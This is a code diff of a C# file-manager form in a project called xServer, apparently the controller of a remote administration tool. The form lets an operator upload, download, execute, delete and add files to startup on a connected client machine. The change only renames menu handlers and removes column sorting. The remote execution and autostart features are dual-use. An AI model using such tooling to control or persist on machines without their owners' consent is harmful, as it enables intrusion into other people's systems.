@@ -19,7 +19,6 @@ namespace xServer.Forms
     {
         private string _currentDir;
         private readonly Client _connectClient;
-        private readonly ListViewColumnSorter _lvwColumnSorter;
         private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file uploads
         public Dictionary<int, string> CanceledUploads = new Dictionary<int, string>();
 
@@ -28,9 +27,6 @@ namespace xServer.Forms
             _connectClient = c;
             _connectClient.Value.FrmFm = this;
             InitializeComponent();
-
-            _lvwColumnSorter = new ListViewColumnSorter();
-            lstDirectory.ListViewItemSorter = _lvwColumnSorter;
         }
 
         private string GetAbsolutePath(string item)
@@ -86,7 +82,7 @@ namespace xServer.Forms
             }
         }
 
-        private void ctxtDownload_Click(object sender, EventArgs e)
+        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem files in lstDirectory.SelectedItems)
             {
@@ -108,7 +104,7 @@ namespace xServer.Forms
             }
         }
 
-        private void ctxtUpload_Click(object sender, EventArgs e)
+        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
         {
             using (var ofd = new OpenFileDialog())
             {
@@ -194,7 +190,7 @@ namespace xServer.Forms
             }
         }
 
-        private void ctxtExecute_Click(object sender, EventArgs e)
+        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem files in lstDirectory.SelectedItems)
             {
@@ -210,7 +206,7 @@ namespace xServer.Forms
             }
         }
 
-        private void ctxtRename_Click(object sender, EventArgs e)
+        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem files in lstDirectory.SelectedItems)
             {
@@ -235,7 +231,7 @@ namespace xServer.Forms
             }
         }
 
-        private void ctxtDelete_Click(object sender, EventArgs e)
+        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem files in lstDirectory.SelectedItems)
             {
@@ -259,7 +255,7 @@ namespace xServer.Forms
             }
         }
 
-        private void ctxtAddToAutostart_Click(object sender, EventArgs e)
+        private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem files in lstDirectory.SelectedItems)
             {
@@ -282,12 +278,12 @@ namespace xServer.Forms
             }
         }
 
-        private void ctxtRefresh_Click(object sender, EventArgs e)
+        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
         {
             RefreshDirectory();
         }
 
-        private void ctxtOpenDirectory_Click(object sender, EventArgs e)
+        private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (_connectClient != null)
             {
@@ -326,7 +322,7 @@ namespace xServer.Forms
                     MessageBoxIcon.Information);
         }
 
-        private void ctxtCancel_Click(object sender, EventArgs e)
+        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem transfer in lstTransfers.SelectedItems)
             {
@@ -350,7 +346,7 @@ namespace xServer.Forms
             }
         }
 
-        private void ctxtRemove_Click(object sender, EventArgs e)
+        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem transfer in lstTransfers.SelectedItems)
             {
@@ -593,7 +589,7 @@ namespace xServer.Forms
                     SetCurrentDir(Path.GetFullPath(Path.Combine(_currentDir, @"..\")));
                     _connectClient.Value.ReceivedLastDirectory = true;
                 }
-                botStrip.Invoke((MethodInvoker)delegate
+                statusStrip.Invoke((MethodInvoker)delegate
                 {
                     stripLblStatus.Text = "Status: " + text;
                 });
@@ -609,28 +605,6 @@ namespace xServer.Forms
             new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
             SetStatus("Loading directory content...");
             _connectClient.Value.ReceivedLastDirectory = false;
-        }
-
-        private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
-        {
-            // Determine if clicked column is already the column that is being sorted.
-            if (e.Column == _lvwColumnSorter.SortColumn)
-            {
-                // Reverse the current sort direction for this column.
-                if (_lvwColumnSorter.Order == SortOrder.Ascending)
-                    _lvwColumnSorter.Order = SortOrder.Descending;
-                else
-                    _lvwColumnSorter.Order = SortOrder.Ascending;
-            }
-            else
-            {
-                // Set the column number that is to be sorted; default to ascending.
-                _lvwColumnSorter.SortColumn = e.Column;
-                _lvwColumnSorter.Order = SortOrder.Ascending;
-            }
-
-            // Perform the sort with these new sort options.
-            lstDirectory.Sort();
         }
     }
 }
